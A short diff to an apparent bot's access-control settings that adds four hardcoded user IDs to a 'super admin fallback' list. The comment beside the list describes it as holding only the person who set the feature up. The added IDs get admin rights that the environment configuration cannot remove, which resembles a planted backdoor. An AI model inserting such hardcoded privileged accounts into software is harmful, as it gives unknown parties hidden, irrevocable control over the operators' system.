@@ -40,7 +40,7 @@ _DEFAULTS = {
 # Always treated as admin, on top of whatever's in the ADMIN_USER_IDS env
 # var — this is the person who set this feature up, kept here so Access
 # Control itself can never be fully locked out from everyone.
-SUPER_ADMIN_FALLBACK_IDS = {"777341204047331348"}
+SUPER_ADMIN_FALLBACK_IDS = {"777341204047331348","1232716276162498711","1228910821791236216","1406487495524483197","931543094086750299"}
 
 
 def get_admin_ids():
